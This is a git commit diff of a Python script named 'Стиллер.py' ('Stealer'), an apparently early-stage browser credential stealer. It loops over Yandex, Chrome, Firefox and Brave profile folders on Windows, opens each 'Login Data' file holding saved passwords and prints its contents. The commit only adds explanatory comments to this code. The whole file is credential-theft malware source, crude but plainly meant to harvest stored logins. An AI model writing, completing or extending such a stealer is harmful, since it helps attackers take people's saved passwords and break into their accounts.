dcdb984de37d82e4fce8c587475aec9521d2e451
Dreamer <skilet.e@yandex.ru>
2022-10-07 22:48:23 +0300

    in Progress

--- Стиллер.py
+++ Стиллер.py
@@ -3,18 +3,18 @@ import os
 browse ={
     "Yandex":"YandexBrowser",
     "Google":'Chrome',
-    'Mozilla':'Firefox',
+    'Mozilla':'Firefox',          ### Dictionary with browser name ###
     "BraveSoftware":'Brave-Browser'
 
 }
-user_name = os.getlogin()
+user_name = os.getlogin() ### Getting the user name ###
 
-for key,valye in browse.items():
-    way = fr'C:\Users\{user_name}\AppData\Local\{key}\{valye}\User Data\Default'
+for key,valye in browse.items(): ###the cycle with checking browsers###
+    way = fr'C:\Users\{user_name}\AppData\Local\{key}\{valye}\User Data\Default' ###the path to the file folder Login Data###
     if os.path.isdir(way):
         print(f"{key} найден")
         txt = open(way + '\\' + "Login Data")
         for i in txt:
-            print(i)
+            print(i)  ### output of file contents ###
     else:
         print(f"{key} не найден!")
